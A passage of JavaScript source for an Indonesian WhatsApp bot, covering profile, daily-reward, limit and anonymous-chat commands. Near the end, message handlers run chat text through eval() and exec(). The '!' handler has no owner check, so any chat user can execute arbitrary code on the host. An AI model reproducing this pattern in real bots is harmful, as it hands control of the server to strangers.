${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
    reply(msg);
 } catch (e) {
 console.error(e);
 reply('Terjadi kesalahan saat mengambil data!');
    }
 break

		case "getpic":
		case "getpp": {
if (isBan) return XRB()
await XReaction()
			if (mentionByreply) {
				try {
					var ppWong = await Alice.profilePictureUrl(mentionByreply, "image")
				} catch {
					var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
				}
				Alice.sendMessage(m.chat, {
					image: {
						url: ppWong
					},
					caption: `Succes!!`
				}, {
					quoted: m
				})
			} else {
				try {
					var ppWong = await Alice.profilePictureUrl(m.sender, "image")
				} catch {
					var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
				}
				Alice.sendMessage(m.chat, {
					image: {
						url: ppWong
					},
					caption: `Succes!!`
				}, {
					quoted: m
				})
			}
		}
		break

		case "getppgc":
if (isBan) return XRB()
await XReaction()
			if (!m.isGroup) return
			await XReaction()
			try {
				var ppimg = await Alice.profilePictureUrl(m.chat, "image")
			} catch (err) {
				console.log(err)
				var ppimg = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
			}
			await Alice.sendMessage(m.chat, {
				image: {
					url: ppimg
				}
			}, {
				quoted: m
			})
			break
		
case 'profile': {
  if (!m.isGroup) return reply(`❌ Fitur ini hanya bisa digunakan di dalam grup!`)

  const sender = m.sender
  const groupId = m.chat
  const pushname = m.pushName || 'Pengguna'

  let userData = JSON.parse(fs.readFileSync('./AliceDatabase/database.json'))
  let koboyData = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Game/koboy.json'))
  let groupData = JSON.parse(fs.readFileSync('./AliceDatabase/database.json'))

  // Inisialisasi jika belum ada
  if (!userData.users) userData.users = {}
  if (!userData.users[sender]) userData.users[sender] = {
    nama: pushname, umur: '-', resi: '-', regTime: Date.now(),
    limit: 10, uang: 0, potion: 0
  }

  if (!koboyData[sender]) koboyData[sender] = {
    nama: pushname, role: 'Koboy',
    uang: 0, bank: 0, exp: 0, ran: '-', status: '-'
  }

  if (!groupData[groupId]) groupData[groupId] = {}
  if (!groupData[groupId][sender]) groupData[groupId][sender] = 0

  groupData[groupId][sender]++ // total chat naik

  // 🏅 Badge EXP
  let exp = koboyData[sender].exp || 0
  let badge = '🥉 Pemula'
  if (exp >= 1000) badge = '👑 Legend'
  else if (exp >= 700) badge = '🥇 Elite'
  else if (exp >= 400) badge = '🥈 Pro'
  else if (exp >= 200) badge = '🔰 Mahir'

  // 🏆 Rank
  function getRank(type, icon) {
    let sorted = Object.entries(userData.users).sort((a, b) => (b[1][type] || 0) - (a[1][type] || 0))
    let total = sorted.length
    let rank = sorted.findIndex(([id]) => id === sender) + 1
    let nilai = userData.users[sender][type] || 0
    return `│ ${icon} Ranking ${type[0].toUpperCase() + type.slice(1)} Kamu: #${rank} dari ${total} (${icon} ${nilai})`
  }

  const toRupiah = n => 'Rp' + (n || 0).toLocaleString('id-ID')
  const regDate = new Date(userData.users[sender].regTime || Date.now()).toLocaleString('id-ID')

  let teks = `
╭───⌈ *👤 PROFIL PENGGUNA* ⌋
│ 🆔 ID: ${sender.split('@')[0]}
│ 📛 Nama: ${userData.users[sender].nama || pushname}
│ 💬 Total Chat Grup: ${groupData[groupId][sender]}x
│ 🏅 Lencana: ${badge}
╰───────────────⬣

╭───⌈ *🤠 STATUS KOB0Y* ⌋
│ 🎖️ Role: ${koboyData[sender].role}
│ 📌 Status: ${koboyData[sender].status}
│ 📊 Ran: ${koboyData[sender].ran}
│ 🧪 EXP: ${exp}
│ 💰 Uang: ${toRupiah(koboyData[sender].uang)}
│ 🏦 Bank: ${toRupiah(koboyData[sender].bank)}
╰───────────────⬣

╭───⌈ *🎮 DATA BOT* ⌋
│ 🎟️ Limit: ${userData.users[sender].limit}
│ 🧴 Potion: ${userData.users[sender].potion}
╰───────────────⬣

╭───⌈ *🏆 LEADERBOARD KAMU* ⌋
${getRank('uang', '💰')}
${getRank('potion', '🧴')}
${getRank('limit', '🎟️')}
╰───────────────⬣
`.trim()

  await reply(teks)

  fs.writeFileSync('./AliceDatabase/database.json', JSON.stringify(userData, null, 2))
  fs.writeFileSync('./AliceSystem/AliceDatabase/Game/koboy.json', JSON.stringify(koboyData, null, 2))
}
break
case 'daily': {
  if (!m.isGroup) return reply("❌ Fitur ini hanya bisa digunakan di grup.")

  let userData = JSON.parse(fs.readFileSync('./AliceDatabase/database.json'))
  if (!userData.users) userData.users = {}
  if (!userData.users[sender]) {
    return reply(`❌ Kamu belum terdaftar.\nKetik *${prefix}register* untuk mulai.`)
  }

  const now = Date.now()
  const last = userData.users[sender].lastClaim || 0
  const cooldown = 86400000 // 24 jam

  const sisa = cooldown - (now - last)
  if (sisa > 0) {
    const jam = Math.floor(sisa / 3600000)
    const menit = Math.floor((sisa % 3600000) / 60000)
    const detik = Math.floor((sisa % 60000) / 1000)
    return reply(`⏳ Kamu sudah klaim hadiah hari ini.\n\nCoba lagi dalam: *${jam} jam ${menit} menit ${detik} detik*`)
  }

  // Hadiah harian
  const reward = {
    uang: 300,
    potion: 1,
    limit: 3
  }

  // Tambahkan hadiah
  userData.users[sender].uang = (userData.users[sender].uang || 0) + reward.uang
  userData.users[sender].potion = (userData.users[sender].potion || 0) + reward.potion
  userData.users[sender].limit = (userData.users[sender].limit || 0) + reward.limit
  userData.users[sender].lastClaim = now

  fs.writeFileSync('./AliceDatabase/database.json', JSON.stringify(userData, null, 2))
  global.db.data.users = userData.users

  return reply(`
🎁 *DAILY REWARD!*

💰 +Rp${reward.uang.toLocaleString()}
🧴 +${reward.potion} Potion
🎟️ +${reward.limit} Limit

📌 Klaim hadiah lagi besok ya! 🌞
`)
}
break
case 'addlimit': {
if (!isOwner) return XRO()
    if (!text) return reply('Format salah!\n\nTambah limit: addlimit <tag orang> <jumlah limit>\nKurangi limit: .dellimit <tag orang> <jumlah limit>')
    
    // Extracting the mentioned user and the limit value from the command text
    let [who, limitValue] = text.split(' ')
    if (!who) return reply('Tag orang yang akan diubah limitnya!')
    if (isNaN(limitValue)) return reply('Jumlah limit harus angka!')

    // Converting limitValue to a number
    limitValue = parseInt(limitValue)

    let user = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
    let users = global.db.data.users

    // Checking if the user is in the database, if not, initialize their limit to 0
    if (!users[user]) users[user] = { limit: 0 }

    // Determining whether to add or remove limit based on the command
    if (command === 'addlimit') {
        // Adding the specified limit to the user's account
        users[user].limit += limitValue
        reply(m.chat, `Berhasil menambahkan ${limitValue} limit untuk @${user.split('@')[0]}!`, m)
    } else if (command === 'remlimit') {
        if (limitValue > users[user].limit) {
            // Set the user's limit to 0 if the specified limit is greater than the user's current limit
            users[user].limit = 0
            reply(m.chat, `Berhasil mengurangi limit untuk @${user.split('@')[0]}. Limit kini menjadi 0!`, m)
        } else {
            // Removing the specified limit from the user's account
            users[user].limit -= limitValue
            reply(m.chat, `Berhasil mengurangi ${limitValue} limit untuk @${user.split('@')[0]}!`, m)
        }
    }
}
break
case 'dellimit':{
if (!isOwner) return XRO()
  if (!text) {
    return reply(m.chat, '• *Example :* .dellimit @user 10', m)
  }

  let mentionedJid = m.mentionedJid[0];
  if (!mentionedJid) {
     return reply(m.chat, 'Tag pengguna yang ingin dikurangi limitnya. Contoh: .dellimit @user 10', m)
  }

  let pointsToSubtract = parseInt(text.split(' ')[1]);
  if (isNaN(pointsToSubtract)) {
    return reply(m.chat, 'Jumlah limit yang dimasukkan harus berupa angka. Contoh: .dellimit @user 10', m)
  }

  let users = global.db.data.users;
  if (!users[mentionedJid]) {
    users[mentionedJid] = {
      limit: 0,
      exp: 0,
      lastclaim: 0
    };
  }

  users[mentionedJid].limit -= pointsToSubtract;
  if (users[mentionedJid].limit < 0) {
    users[mentionedJid].limit = 0;
  }

  reply(m.chat, `Berhasil mengurangi ${pointsToSubtract} limit untuk @${mentionedJid.split('@')[0]}.`, m, {
    mentions: [mentionedJid]
  });
};
break;
case 'resetlimit': {
if (!isOwner) return XRO()
let listt = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 0 : isNumber(args[0]) ? parseInt(args[0]) : 0
	lim = Math.max(1, lim)
	listt.map(([user, data], i) => (Number(data.limit = lim)))
reply(m.chat, `*Limit berhasil direset ${lim} / user*`, m)
}
            break 
            
case 'totalfitur':{
reply(`Total Fitur Bot : ${totalfitur()}`)
}
break
  
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Batas All Case
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
default:
}
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
 
if (budy.startsWith('=>')) {
if (!isOwner) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isOwner) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isOwner) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if (m.chat.endsWith('@s.whatsapp.net')) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(budy)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(budy)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}} : {})
}}

if (m.chat.endsWith('@s.whatsapp.net')) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(start|leave|next)/.test(m.text)) return
if (['.start','.leave','.next','.mulai','.keluar','.lanjut','.skip'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}}:{})
}
return !0
}

} catch (e) {
console.log(util.format(e))
let x = String(e)
Alice.sendMessage(`${owner}` + "@s.whatsapp.net", { text: `Laporan Error!! <>\n` + util.format(x), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}}

setInterval(async () => {
  const fs = require('fs');
  const sewaPath = './AliceDatabase/sewa.json';
  if (!fs.existsSync(sewaPath)) return;
  const sewa = JSON.parse(fs.readFileSync(sewaPath));
  const now = Math.floor(Date.now() / 1000);

  for (let groupId in sewa) {
    const { expired } = sewa[groupId];
    if (expired !== 0 && expired < now) {
      try {
        await Alice.sendMessage(groupId, { text: '⚠️ Masa sewa bot telah *berakhir*. Bot akan keluar dari grup.\n\nHubungi owner untuk perpanjangan.' });
        await Alice.groupLeave(groupId);
      } catch (err) {
        console.log(`[SEWA] Gagal keluar dari ${groupId}:`, err);
      }
      delete sewa[groupId];
    }
  }

  fs.writeFileSync(sewaPath, JSON.stringify(sewa, null, 2));
}, 60 * 1000); // cek setiap 1 menit

//————————————————————————//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Succes Update : '${__filename}'`))
	delete require.cache[file]
	require(file)
})
// TERIMAKASIH SUDAH MEMAKAI SC KAMI
// Credit : XyrooRynzz
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\